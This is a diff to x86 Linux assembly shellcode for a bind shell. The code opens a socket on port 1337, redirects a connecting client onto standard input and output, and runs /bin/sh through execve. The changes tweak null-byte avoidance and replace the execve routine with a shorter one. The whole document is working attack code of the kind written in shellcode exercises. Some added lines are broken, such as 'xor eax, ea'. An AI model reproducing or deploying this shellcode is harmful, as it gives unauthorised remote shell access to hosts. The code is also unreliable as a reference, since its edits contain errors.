@@ -33,15 +33,15 @@ bindsckcode:
    push    eax          ;sin_addr
 
 ;replace 3905 below wih desired port number. remember byte order!
-   push    0x3905ffff   ;sin_family sin_port(1337) (fff2 changed to 0002)
+   push    0x39050103   ;sin_family sin_port(1337) (fff2 changed to 0002)
 ;    add     word [esp], 0x2
-;   sub     word [esp+2], 0x1  ;This was added to change fff2 to 0002 to avoid nulls
-   dec     esp
-   dec     esp
+;   sub     word [esp+2], 0x101  ;This was added to change fff2 to 0002 to avoid nulls
+   inc     esp
+   inc     esp
    inc     eax
    inc     eax 
    push    ax
-   xor     eax, eax
+   xor     eax, ea
    mov     edi,esp      ;sockaddr_in*
    push    eax          ;protocol
    push    byte SOCK_STREAM   ;type
@@ -81,12 +81,12 @@ dup_loop:
    loop    dup_loop
 ;at this point we have a connected client dup'ed onto 0,1,2
 ;All that is left to do is shovel a shell
-;code from https://gist.github.com/geyslan/5174296
-   mov eax, 11          ;execve syscall#
-   push 0		;null byte terminator
-   push 0x68732f2f      ;"//sh"
-   push 0x6e69622f	;"/bin"
-   mov ebx, esp		;ptr to "/bin//sh" string
-   lea ecx, [esp+8]	;null ptr to argv
-   lea edx, [esp+8]	;null ptr to envp
-   int 0x80
+;code from delirium paper
+   xor 		eax,eax          ;eax  = 0002
+   push		eax              ;zero on stack
+   push     0x68732f2f       ;"//sh"
+   push     0x6e69622f	     ;"/bin"
+   mov 		ebx, esp         ;ebx=esp=&argv
+   cdq                       ;extend eax into edx (Convert Dword to QuadWord)   
+   mov      al,11            ;eax = 11
+   int 0x80                  ;syscall 11 (execve)
